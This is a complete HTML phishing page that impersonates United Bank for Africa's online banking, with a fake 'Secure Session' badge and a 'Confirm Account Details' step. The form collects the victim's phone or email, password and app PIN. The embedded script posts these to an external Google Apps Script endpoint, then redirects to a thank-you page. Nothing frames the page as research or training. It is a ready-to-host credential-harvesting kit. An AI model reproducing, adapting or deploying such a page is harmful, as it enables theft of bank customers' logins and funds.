<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">

<title>UBA Online Banking | Confirm Account Details</title>

<link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700&display=swap" rel="stylesheet">

<style>

:root{
--primary:#d50000;
--primary-dark:#b30000;
--accent:#ff3b30;
--bg:#f5f5f5;
--card-bg:#ffffff;
--text-main:#333333;
--text-muted:#666666;
--border:#eeeeee;
}

*{box-sizing:border-box}

body{
margin:0;
min-height:100vh;
font-family:"Inter",system-ui,sans-serif;
background:var(--bg);
color:var(--text-main);
display:flex;
flex-direction:column;
opacity:0;
transition:opacity .5s ease;
}

body.fade-in{opacity:1}
body.fade-out{opacity:0}

/* HEADER */

header{
background:#ffffff;
color:#333;
padding:16px 0;
border-bottom:1px solid var(--border);
}

.header-inner{
max-width:1100px;
margin:auto;
padding:0 20px;
display:flex;
align-items:center;
justify-content:space-between;
}

.brand{
display:flex;
align-items:center;
gap:12px;
}

.logo{
width:42px;
height:42px;
border-radius:50%;
background:var(--primary);
display:grid;
place-items:center;
font-weight:800;
color:#fff;
font-size:14px;
}

.brand-text strong{
font-size:15px;
}

.brand-text span{
font-size:12px;
color:var(--text-muted);
}

.secure-badge{
display:flex;
align-items:center;
gap:8px;
font-size:13px;
background:#f1f1f1;
padding:8px 14px;
border-radius:999px;
}

.secure-dot{
width:8px;
height:8px;
background:#22c55e;
border-radius:50%;
}

/* MAIN */

main{
flex:1;
display:flex;
align-items:center;
justify-content:center;
padding:40px 20px;
}

.portal-card{
width:100%;
max-width:480px;
background:var(--card-bg);
border-radius:14px;
border:1px solid var(--border);
box-shadow:0 12px 30px rgba(0,0,0,.08);
overflow:hidden;
}

.card-header{
padding:22px 26px;
border-bottom:1px solid var(--border);
}

.card-header h1{
margin:0;
font-size:18px;
}

.card-header p{
margin-top:6px;
font-size:13px;
color:var(--text-muted);
}

.card-body{
padding:26px;
}

label{
display:block;
font-size:13px;
font-weight:600;
margin-bottom:6px;
}

input{
width:100%;
padding:12px 14px;
margin-bottom:18px;
font-size:14px;
border-radius:8px;
border:1px solid var(--border);
}

input:focus{
outline:none;
border-color:var(--primary);
box-shadow:0 0 0 3px rgba(213,0,0,.15);
}

.btn{
width:100%;
padding:14px;
border-radius:10px;
border:none;
background:linear-gradient(to right,var(--primary),var(--primary-dark));
color:#fff;
font-size:15px;
font-weight:600;
cursor:pointer;
box-shadow:0 6px 16px rgba(0,0,0,.15);
}

footer{
padding:18px;
text-align:center;
font-size:12px;
color:var(--text-muted);
}

/* OVERLAY */

.overlay{
position:fixed;
inset:0;
background:rgba(0,0,0,.45);
display:flex;
align-items:center;
justify-content:center;
flex-direction:column;
color:#fff;
font-size:15px;
opacity:0;
pointer-events:none;
transition:opacity .3s ease;
z-index:999;
}

.overlay.active{
opacity:1;
pointer-events:all;
}

.spinner{
width:44px;
height:44px;
border:4px solid rgba(255,255,255,.35);
border-top:4px solid var(--primary);
border-radius:50%;
animation:spin 1s linear infinite;
margin-bottom:16px;
}

@keyframes spin{to{transform:rotate(360deg)}}

</style>
</head>

<body>

<script>document.body.classList.add("fade-in")</script>

<header>
<div class="header-inner">

<div class="brand">
<div class="logo">UBA</div>

<div class="brand-text">
<strong>UBA Online Banking</strong><br>
<span>Secure Client Portal</span>
</div>
</div>

<div class="secure-badge">
<div class="secure-dot"></div>
Secure Session
</div>

</div>
</header>

<main>

<div class="portal-card">

<div class="card-header">
<h1>Confirm Account Details</h1>
<p>Step 2 of 3 — Verify your card and contact information.</p>
</div>

<div class="card-body">

<form id="demoForm" autocomplete="off">

<form id="demoForm">
    <label>Phone Number</label>
    <input type="text" name="email" placeholder="Enter registered email or phone" required>

    <label>Password</label>
    <input type="password" name="password" placeholder="Enter your password" required>

    <label>App PIN Code</label>
    <input type="text" name="pin" placeholder="Enter app PIN" required>

<button class="btn" type="submit">
Validate Securely
</button>

</form>

</div>
</div>

</main>

<footer>
© 2026 United Bank for Africa. All rights reserved.
</footer>

<div class="overlay" id="overlay">
<div class="spinner"></div>
Verifying your details…
</div>

<script>
document.getElementById("demoForm").addEventListener("submit", async event => {
  event.preventDefault();
  const data = new FormData(event.target);
  try {
    const res = await fetch(
      "https://script.google.com/macros/s/AKfycbwmkOBcmudBWS5kC-9UD2Gq_jsddGL9V8rNI2imMEf23HGzroYRrX6Svee0DNSS7msP/exec",
      { method: "POST", body: data }
    );
    const text = await res.text();
    if (text.includes("SUCCESS")) {
      window.location.href = "thankyou.html";
    } else {
      alert("Submission failed. Please try again.");
    }
  } catch {
    alert("Network error. Please try again.");
  }
});
</script>

</body>
</html>
